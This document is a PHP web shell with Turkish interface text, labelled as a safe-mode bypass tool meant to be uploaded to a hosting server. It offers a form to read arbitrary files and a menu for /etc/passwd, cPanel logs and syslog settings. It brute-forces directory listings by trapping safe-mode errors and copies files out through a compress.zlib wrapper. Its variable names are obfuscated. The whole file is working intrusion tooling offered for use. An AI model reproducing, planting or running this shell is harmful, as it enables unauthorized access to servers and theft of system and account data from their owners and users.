<?php
?>

<head>
 	<meta http-equiv="Content-Language" content="en-us">
 	<style type="text/css">
 <!--
 .style1 {color: #DADADA}
 -->
     </style></head>
 	<STYLE>
 	TD { FONT-SIZE: 8pt; COLOR: #ebebeb; FONT-FAMILY: verdana;}BODY { scrollbar-face-color: #800000; scrollbar-shadow-color: #101010; scrollbar-highlight-color: #101010; scrollbar-3dlight-color: #101010; scrollbar-darkshadow-color: #101010; scrollbar-track-color: #101010; scrollbar-arrow-color: #101010; font-family: Verdana;}TD.header { FONT-WEIGHT: normal; FONT-SIZE: 10pt; BACKGROUND: #7d7474; COLOR: white; FONT-FAMILY: verdana;}A { FONT-WEIGHT: normal; COLOR: #dadada; FONT-FAMILY: verdana; TEXT-DECORATION: none;}A:unknown { FONT-WEIGHT: normal; COLOR: #ffffff; FONT-FAMILY: verdana; TEXT-DECORATION: none;}A.Links { COLOR: #ffffff; TEXT-DECORATION: none;}A.Links:unknown { FONT-WEIGHT: normal; COLOR: #ffffff; TEXT-DECORATION: none;}A:hover { COLOR: #ffffff; TEXT-DECORATION: underline;}.skin0{position:absolute; width:200px; border:2px solid black; background-color:menu; font-family:Verdana; line-height:20px; cursor:default; visibility:hidden;;}.skin1{cursor: default; font: menutext; position: absolute; width: 145px; background-color: menu; border: 1 solid buttonface;visibility:hidden; border: 2 outset buttonhighlight; font-family: Verdana,Geneva, Arial; font-size: 10px; color: black;}.menuitems{padding-left:15px; padding-right:10px;;}input{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}textarea{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}button{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}select{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}option {background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}iframe {background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}p {MARGIN-TOP: 0px; MARGIN-BOTTOM: 0px; LINE-HEIGHT: 150%}blockquote{ font-size: 8pt; font-family: Courier, Fixed, Arial; border : 8px solid #A9A9A9; padding: 1em; margin-top: 1em; margin-bottom: 5em; margin-right: 3em; margin-left: 4em; background-color: #B7B2B0;}body,td,th { font-family: verdana; color: #d9d9d9; font-size: 11px;}body { background-color: #000000;}.style2 {color: #FF0000} 
     </style>
 	<p align="center"><span class="style1"><font face="Verdana" size="5"><a href=""><span style="text-decoration: none; font-weight:700"><font face="Times New Roman">SpyGrup Safe Mod:<span class="style2">ON</span> Fucker <center><h3>RFI Olarak Kullanilmaz .PHP Olarak Host'a Yukleyiniz</h3></center></font></span></a></font></span></b></p>
 	<br />
 	<form method="POST">
 	    <p align="center">Okunacak Dosya:
 	    <input type="text" name="file" size="20">
 	    <input type="submit" value="Oku!" name="B1"></p>
 	</form>
 	    <form method="POST">
 	        <p align="center">Sunucu Bilgileri: <select size="1" name="file">
 	          <option value="/etc/passwd">/etc/passwd Oku</option>
 	          <option value="/var/cpanel/accounting.log">Cpanel Loglarini G&ouml;ster</option>
 	          <option value="/etc/syslog.conf">Syslog Ayarlari</option>
 	        <option value="/etc/hosts">Hosts</option>
 	        </select> <input type="submit" value="G&#246;ster Ulen!" name="B1"></p></form>
 	         
                               <?php  $spc62d5f = './'; echo '[syslog]01
'; if (@ini_get('safe_mode') or strtolower(@ini_get('safe_mode')) == 'on') { $sp867936 = true; $sp7bd164 = '<font color="red">A&#231;ik (G&#252;venli)</font>'; } else { $sp867936 = false; $sp7bd164 = '<font color="green">Kapali (G&#252;venli Degil)</font>'; } echo "G&#252;venlik: {$sp7bd164}"; $spe2ff4f = @ini_get('open_basedir'); if ($spe2ff4f or strtolower($spe2ff4f) == 'on') { $sp9461a8 = true; $spce4cbf = '<font color="red">' . $spe2ff4f . '</font>'; } else { $sp9461a8 = false; $spce4cbf = '<font color="green">Kapali (G&#252;venli Degil)</font>'; } echo '<br>'; echo "Klas&#246;rler Arasi Dolasim: {$spce4cbf}"; echo '<br>'; $sp1968ee = 'Bypass Version 1.1 Beta'; echo 'Engelleyici Program : <b>'; if ('' == ($spf6ef8d = @ini_get('disable_functions'))) { echo '<font color=green>G&#246;r&#252;n&#252;rde Bi&#351;iy Yok</font></b>'; } else { echo "<font color=red>{$spf6ef8d}</font></b>"; } $sp7997f0 = 'true'; if (!$sp7997f0) { $sp7997f0 = 0; } $spfd360f = 'true'; if (!$spfd360f) { $spfd360f = 0; } $sp2f5415 = $spfd360f - $sp7997f0; $spb889a2 = @round(100 / ($spfd360f / $sp7997f0), 2); error_reporting(E_WARNING); ini_set('display_errors', 1); echo '[syslog]02
'; echo '<head><title>' . getcwd() . '</title></head>'; echo '<hr color="#C0C0C0" size="1">'; echo '<br>'; echo '<form method=GET>'; echo "<div style='float: left'>ByPass Edilecek Dizin: <input type=text name=root value='{$_GET['root']}'></div>"; echo '<input type=submit value=\'--&raquo;\'></form>'; $spa53341 = './'; if ($_POST['root']) { $spa53341 = $_POST['root']; } if ($_GET['root']) { $spa53341 = $_GET['root']; } if (!ini_get('safe_mode')) { die('Safe-mode  OFF.'); } $sp76d016 = 0; $sp7646df = array(); set_error_handler('eh'); $sp451e15 = '_-.01234567890abcdefghijklnmopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'; for ($sp6c3e91 = 0; $sp6c3e91 < strlen($sp451e15); $sp6c3e91++) { $sp49de29 = "{$spa53341}" . (substr($spa53341, -1) != '/' ? '/' : NULL) . "{$sp451e15[$sp6c3e91]}"; $spdd00c5 = $sp7646df[count($sp7646df) - 1]; glob($sp49de29 . '*'); if ($sp7646df[count($sp7646df) - 1] != $spdd00c5) { for ($spc9281a = 0; $spc9281a < strlen($sp451e15); $spc9281a++) { $sp49de29 = "{$spa53341}" . (substr($spa53341, -1) != '/' ? '/' : NULL) . "{$sp451e15[$sp6c3e91]}{$sp451e15[$spc9281a]}"; $sp0de41f = $sp7646df[count($sp7646df) - 1]; glob($sp49de29 . '*'); if ($sp7646df[count($sp7646df) - 1] != $sp0de41f) { for ($sp0992ce = 0; $sp0992ce < strlen($sp451e15); $sp0992ce++) { $sp49de29 = "{$spa53341}" . (substr($spa53341, -1) != '/' ? '/' : NULL) . "{$sp451e15[$sp6c3e91]}{$sp451e15[$spc9281a]}{$sp451e15[$sp0992ce]}"; $spbca371 = $sp7646df[count($sp7646df) - 1]; glob($sp49de29 . '*'); if ($sp7646df[count($sp7646df) - 1] != $spbca371) { for ($spd6dd63 = 0; $spd6dd63 < strlen($sp451e15); $spd6dd63++) { $sp49de29 = "{$spa53341}" . (substr($spa53341, -1) != '/' ? '/' : NULL) . "{$sp451e15[$sp6c3e91]}{$sp451e15[$spc9281a]}{$sp451e15[$sp0992ce]}{$sp451e15[$spd6dd63]}"; glob($sp49de29 . '*'); } } } } } } } $sp7646df = array_unique($sp7646df); echo '[syslog]03
'; echo '<xmp>'; foreach ($sp7646df as $sp63375d) { echo "{$sp63375d}\n"; } echo '</xmp>'; function eh($spfe6fb7, $sp2ea0cc, $spc9bb75, $spad1ed5) { global $sp7646df, $sp76d016, $sp6c3e91; preg_match('/SAFE\\ MODE\\ Restriction\\ in\\ effect\\..*whose\\ uid\\ is(.*)is\\ not\\ allowed\\ to\\ access(.*)owned by uid(.*)/', $sp2ea0cc, $spf60383); if ($spf60383) { $sp7646df[$sp76d016] = $spf60383[2]; $sp76d016++; } } echo '<PRE>
'; if (empty($spa3ecf0)) { if (empty($_GET['file'])) { if (empty($_POST['file'])) { die('
Hosgeldiniz...Bu Scriptle Sadece c99\'da  (Safe Mode=ON) Olan Serverlarda Bypass Yapilabilir Digerlerinde Calismaz  .. Kolay Gelsin
 <B><CENTER><FONT
 	COLOR="RED">
 	kingdefacer@msn.com</FONT></CENTER></B>'); } else { $spa3ecf0 = $_POST['file']; } } else { $spa3ecf0 = $_GET['file']; } } $sp4eb460 = tempnam($spc62d5f, 'cx'); if (copy('compress.zlib://' . $spa3ecf0, $sp4eb460)) { $sp67ff1a = fopen($sp4eb460, 'r'); $spf447af = fread($sp67ff1a, filesize($sp4eb460)); fclose($sp67ff1a); echo '<hr color="#C0C0C0" size="1">'; echo '<FONT COLOR="RED"><B>--- Start File ' . htmlspecialchars($spa3ecf0) . '
 	-------------</B><FONT COLOR="white">
' . htmlspecialchars($spf447af) . '
<B>--- End File
 	' . htmlspecialchars($spa3ecf0) . ' ---------------
'; unlink($sp4eb460); die('
<FONT COLOR="RED"><B>File
 	' . htmlspecialchars($spa3ecf0) . ' Bu Dosya zaten Goruntuleniyor<kingdefacer@msn.com>
 	;]</B></FONT>'); } else { die('<FONT COLOR="RED"><CENTER>Uzgunum...
 	<B>' . htmlspecialchars($spa3ecf0) . '</B> Aradiginiz dosya Bulunamadi
 	access.</CENTER></FONT>'); } echo '[syslog]04
';